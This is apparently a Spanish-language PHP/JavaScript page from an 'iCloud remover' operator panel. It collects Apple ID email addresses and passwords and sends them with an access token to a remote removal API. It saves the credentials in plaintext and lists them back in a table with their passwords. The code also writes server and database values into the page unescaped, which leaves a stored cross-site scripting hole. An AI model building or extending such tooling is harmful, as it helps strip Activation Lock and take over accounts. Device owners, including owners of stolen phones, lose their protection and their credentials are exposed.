<!-- Content Wrapper. Contains page content -->
<div class="content-wrapper">
   <!-- Content Header (Page header) -->
   <section class="content-header">
      <div class="container-fluid">
         <div class="row mb-2">
            <?php if($server['status_msg_notificacion'] == 1){ ?>
             <div class="col-sm-12">
              <div class="card">
               <div class="card-body">
                  <?php if(!empty($server['msg_notificacion'])): echo $server['msg_notificacion']; endif;?>
               </div>
             </div>
            </div>
            <?php } ?> 
            <div class="col-sm-6">
               <h1>Remover iCloud</h1>
            </div>
            <div class="col-sm-6">
               <ol class="breadcrumb float-sm-right">
                  <li class="breadcrumb-item"><a href="#">Remover</a></li>
                  <li class="breadcrumb-item active">iCloud</li>
               </ol>
            </div>
         </div>
      </div>
      <!-- /.container-fluid -->
   </section>
   <!-- Main content -->
   <section class="content">
      <div class="container-fluid">
         <div class="row">
            <div class="col-md-12">
               <div class="card card-info">
                  <div class="card-header">
                     <h3 class="card-title">Remover iCloud</h3>
                  </div>
                  <div class="card-body">
                     <form class="form-horizontal form-bordered form-remove">
                        <div class="form-group">
                           <label>ID de Apple:</label>
                           <div class="input-group">
                              <div class="input-group-prepend">
                                 <span class="input-group-text"><i class="fas fa-at"></i></span>
                              </div>
                              <input type="text" class="form-control" placeholder="usuario@email.com" id = "idapple" name="idapple" required>
                              <div class="invalid-tooltip">El campo es requerido.</div>
                           </div>
                        </div>
                        <!-- phone mask -->
                        <div class="form-group">
                           <label>Contraseña:</label>
                           <div class="input-group">
                              <div class="input-group-prepend">
                                 <span class="input-group-text"><i class="fa fa-key"></i></span>
                              </div>
                              <input type="password" class="form-control" placeholder="**********" id = "password" name = "password"  required>
                              <div class="invalid-tooltip">El campo es requerido.</div>
                           </div>
                        </div>
                        <hr>
                        <div class="form-group">
                           <label class="col-md-12 col-form-label">
                              <div style="display: inline-block;">
                                 <button type="submit" class="btn btn-block btn-outline-primary" >Remover</button>
                              </div>
                              <div style="display: inline-block;">
                                 <span id = "reloadIcloud"></span>                       
                              </div>
                           </label>
                        </div>
                        <br>
                        <div id="result"></div>
                     </form>
                     <hr>
                     <div class="col-sm-6">
                        <h1>Equipos removidos</h1>
                     </div>
                     <hr>
                     <div class="card-header">
                        <!--<h3 class="card-title">Lista de obtenidos</h3>-->
                        <div class="card-tools">
                           <div class="input-group input-group-sm">
                              <input type="text" class="form-control" id = "buscarequiporemove" placeholder="Buscar equipo">
                              <div class="input-group-append">
                                 <div class="btn btn-primary" style="background-color: #28a745!important;">
                                    <i class="fas fa-search"></i>
                                 </div>
                              </div>
                           </div>
                        </div>
                        <!-- /.card-tools -->
                     </div>
                     <div class="card-body table-responsive p-0 tablalistremove" style="max-height:300px;">
                        <table class="table table-sm table-hover">
                           <thead>
                              <tr>
                                 <th></th>
                                 <th>ID de Apple</th>
                                 <th>Contraseña</th>
                                 <th>Fecha</th>
                                 <th>Detalles</th>
                              </tr>
                           </thead>
                           <tbody id="bodytablalistremove">
                              <div id="reloadIcloudremove"></div>
                           </tbody>
                        </table>
                     </div>
                  </div>
               </div>
               <!-- /.card -->
            </div>
         </div>
      </div>
      <div class="modal" id="modalremove">
         <div class="modal-dialog" role="document" tabindex="-1" role="dialog">
            <div class="modal-content">
               <!-- Modal Header -->
               <div class="modal-header">
                  <h4 class="modal-title">Detalles del procedimiento</h4>
                  <button type="button" class="close" data-dismiss="modal">&times;</button>
               </div>
               <!-- Modal body -->
               <div class="modal-body modal-body-remove" style="text-align: center;">
               </div>
               <!-- Modal footer -->
               <div class="modal-footer">
                  <button type="button" class="btn btn-info" data-dismiss="modal">Cerrar</button>
               </div>
            </div>
         </div>
      </div>
      <div class="modal" id="viewAutoremove">
         <div class="modal-dialog" role="document" tabindex="-1" role="dialog">
            <div class="modal-content">
               <!-- Modal Header -->
               <div class="modal-header">
                  <h4 class="modal-title">Detalles del autoremove</h4>
                  <button type="button" class="close" data-dismiss="modal">&times;</button>
               </div>
               <!-- Modal body -->
               <div class="modal-body modal-body-autoremove" style="text-align: center;">
               </div>
               <!-- Modal footer -->
               <div class="modal-footer">
                  <button type="button" class="btn btn-info" data-dismiss="modal">Cerrar</button>
               </div>
            </div>
         </div>
      </div>
   </section>
   <!-- Control Sidebar -->
   <aside class="control-sidebar control-sidebar-dark">
      <!-- Control sidebar content goes here -->
   </aside>
   <!-- /.control-sidebar -->
   <!-- Main Footer -->
   <footer class="main-footer">
      <strong>Copyright &copy; <?php  echo date('Y'); ?> <a href="<?php echo base_url();?>"><?php echo $server['descripcionserver']; ?></a>.</strong>
      Todos los derechos reservados
      <div class="float-right d-none d-sm-inline-block">
         <b>Version</b> 2.0
      </div>
   </footer>
</div>
<!-- ./wrapper -->
<!-- REQUIRED SCRIPTS -->
<!-- jQuery -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
<script src="<?php echo base_url();?>/public/assets/axios.min.js"></script>
<script src="<?php echo base_url();?>/public/assets/plugins/bootstrap/js/bootstrap.bundle.min.js"></script>
<!-- overlayScrollbars -->
<script src="<?php echo base_url();?>/public/assets/plugins/overlayScrollbars/js/jquery.overlayScrollbars.min.js"></script>
<!-- AdminLTE App -->
<script src="<?php echo base_url();?>/public/assets/dist/js/adminlte.js"></script>
<!-- OPTIONAL SCRIPTS -->
<script src="<?php echo base_url();?>/public/assets/dist/js/demo.js"></script>
<!-- PAGE PLUGINS -->
<!-- jQuery Mapael -->
<script src="<?php echo base_url();?>/public/assets/plugins/jquery-mousewheel/jquery.mousewheel.js"></script>
<script src="<?php echo base_url();?>/public/assets/plugins/raphael/raphael.min.js"></script>
<script src="<?php echo base_url();?>/public/assets/plugins/jquery-mapael/jquery.mapael.min.js"></script>
<script src="<?php echo base_url();?>/public/assets/plugins/jquery-mapael/maps/usa_states.min.js"></script>
<!-- ChartJS -->
<script src="<?php echo base_url();?>/public/assets/plugins/chart.js/Chart.min.js"></script>
<script src="<?php echo base_url();?>/public/assets/server/js/modal.js"></script>
<script src="<?php echo base_url();?>/public/assets/server/js/classie.js"></script>
<script src="<?php echo base_url();?>/public/assets/server/js/modalEffects.js"></script>
<script src="<?php echo base_url();?>/public/assets/plugins/bootstrap-switch/js/bootstrap-switch.min.js"></script>
<script src="<?php echo base_url();?>/public/assets/plugins/sweetalert2/sweetalert2.min.js"></script>
<script type="text/javascript">


let base_url = location.href;
let urlaccess = "<?=$server['urlaccess']?>";
let token_access = "<?=$server['token_access']?>";
let ip = "<?=$ip?>";


$(document).ready(function () {


   setTimeout(function () {
      $(".theme-loader").fadeOut("slow");
   }, 500)

   $("#title").html($("#title").html() + " .::. Remover")

   $(".li-removeri").addClass('active')

   allremoverPanel("");

})


window.onload = (function () {
   try {
      $("#buscarequiporemove").on('keyup', function () {

         $('#bodyTable').html('<td colspan="16" align="center"><div style = "color: gray;font-size: 15px;"><img src="../public/assets/server/img/loading.gif" /></div></td>')
         var value = $(this).val();
         if (value == "") {
            allremoverPanel("");

         } else {

            allremoverPanel(value);
         }
      }).keyup();
   } catch (e) {}


});


$(document).on("submit", ".form-remove", function (event) {

   event.preventDefault();

   const Toast = Swal.mixin({
      toast: true,
      position: 'top-end',
      showConfirmButton: false,
      timer: 3000
   });


   if ($("#idapple").val() != "" && $("#password").val() != "") {

      $("#idapple").removeClass('is-invalid');
      $("#password").removeClass('is-invalid');

      $("#modalremove").modal('show');


      $('.modal-body-remove').html('<div class="loader-block"><svg id="loader2" viewBox="0 0 100 100"><circle id="circle-loader2" cx="50" cy="50" r="45"></circle></svg></div>')

      const HTTP = axios.create({
         baseURL: urlaccess
      })

      let datos = {
         ip_access: ip,
         token_access: token_access,
         email: $("#idapple").val(),
         password: $("#password").val()

      }

      HTTP.post("/RestAPI/remover_ic", datos)
         .then(resp => {

            $('.modal-body-remove').html("");

            let respuesta = resp.data;

            let respuesta_recibida = respuesta.response.replace(/\[/g,'<br>[')
                                                        .replace(/OFF/g,'<br>OFF')
                                                        .replace(/On/g,'<br>On')
                                                        .replace(/OK/g,'OK<br>')
                                                        .replace(/\?/g, '')
                                                        .replace(/\]/g,'] <i class="fa fa-mobile" aria-hidden="true" style = "color:blue;"></i> ')
                                                        .replace(/OK/g,'OK <i class="fa fa-check" aria-hidden="true" style = "color:green;"></i> ')

            $('.modal-body-remove').html('<center>' + respuesta_recibida + '</center>');
            insertar_autoremove($("#idapple").val(), $("#password").val(), respuesta_recibida)

            

         })
   }


});


function insertar_autoremove(email, password, resp) {

   var data_form = {
      email: $("#idapple").val(),
      password: $("#password").val(),
      response: resp
   }

   var url_php = 'autoremove/insertar_autoremove';
   $.ajax({
      type: 'POST',
      url: url_php,
      data: data_form,
      dataType: 'json',
      async: true
   }).done(function ajaxDone(resp) {

      allremoverPanel("");

   })
}


function allremoverPanel(buscar) {

   var data_form = {
      buscar: buscar
   }

   var url_php = 'autoremove/getallautoremovemanual';
   $.ajax({
      type: 'POST',
      url: url_php,
      data: data_form,
      dataType: 'json',
      async: true,
      beforeSend: function () {
         //('#reloadIcloud').html('<img src="../public/assets/img/loading.gif" /><a>Procesando<a>');
      },
   }).done(function ajaxDone(res) {
      console.log(res)
      $('#reloadIcloudremove').html('');
      $("#bodytablalistremove").html('');
      if (res != null && $.isArray(res)) {
         var i = 1;
         if (res == "") {
            $("#bodytablalistremove").html('<td colspan="16" align="center"><div style = "color: gray;font-size: 15px;">No tienes Requerimientos que mostrar</div></td>');

         } else {
            $.each(res, function (index, value) {


               $("#bodytablalistremove").append("<tr>" +
                  "<td style = 'padding: 0.7em!important'><div class='btn-group' style = 'inline-size: max-content;'>" +
                  '<font class="btn btn-sm" style = "cursor: pointer;" onclick="deleteremov(' + value.id + ')"><span class="fa fa-times" aria-hidden="true" style = "color: #dc3545;font-size: 20px;"></span></font>' +
                  "</div></td>" +
                  "<td style = 'padding: 0.7em!important'>" + value.appleid + "</td>" +
                  "<td style = 'padding: 0.7em!important'>" + value.password + "</td>" +
                  "<td style = 'padding: 0.7em!important'>" + value.fecha + "</td>" +
                  "<td style = 'padding: 0.7em!important'><div class='btn-group' style = 'inline-size: max-content;'>" +
                  '<font class="btn btn-sm" style = "cursor: pointer;" onclick="view_modal_autoremove(' + value.id + ')"><span class="fa fa-eye" aria-hidden="true" style = "color: green;font-size: 25px;"></span></font>' +
                  "</div></td>" +
                  "</tr>");
               i++;
            });
         }
      }


   }).fail(function ajaxError(e) {
      console.log(e);
   }).always(function ajaxSiempre() {})
   return false;


}

function view_modal_autoremove(id) {
   $("#viewAutoremove").modal('show');
   $('.modal-body-autoremove').html('<center><div class="loader-block"><svg id="loader2" viewBox="0 0 100 100"><circle id="circle-loader2" cx="50" cy="50" r="45"></circle></svg></div></center>')

   var data_form = {
      id: id
   }

   var url_php = 'autoremove/detallesautoremovemanual';
   $.ajax({
      type: 'POST',
      url: url_php,
      data: data_form,
      dataType: 'json',
      async: true,
      beforeSend: function () {
         //('#reloadIcloud').html('<img src="../public/assets/img/loading.gif" /><a>Procesando<a>');
      },
   }).done(function ajaxDone(res) {
      $('.modal-body-autoremove').html('');
      $(".modal-body-autoremove").html('<center>' + res['response'].replace(/[\n]/g,'<br>') + '</center>');

   })

   //
}


function deleteremov(id) {
   Swal.fire({
      title: 'Estás seguro que desea eliminar este requerimiento?',
      text: "<-- Selecciona una opción -->",
      icon: 'warning',
      showCancelButton: true,
      confirmButtonColor: '#3085d6',
      cancelButtonColor: '#d33',
      confirmButtonText: 'Si, eliminar!'
   }).then((result) => {
      if (result.value) {

         var data_form = {
            id: id
         }

         var url_php = 'autoremove/deletesautoremovemanual';
         $.ajax({
            type: 'POST',
            url: url_php,
            data: data_form,
            dataType: 'json',
            async: true,
            beforeSend: function () {
               //('#reloadIcloud').html('<img src="../public/assets/img/loading.gif" /><a>Procesando<a>');
            },
         }).done(function ajaxDone(res) {

            if (res == true) {

               Swal.fire(
                  'Eliminado!',
                  'El requerimiento ha sido eliminado.',
                  'success'
               )

               allremoverPanel("")


            }


         })


      }
   })
}
   
   
   
   
         
   
      
</script>
</body>
</html>
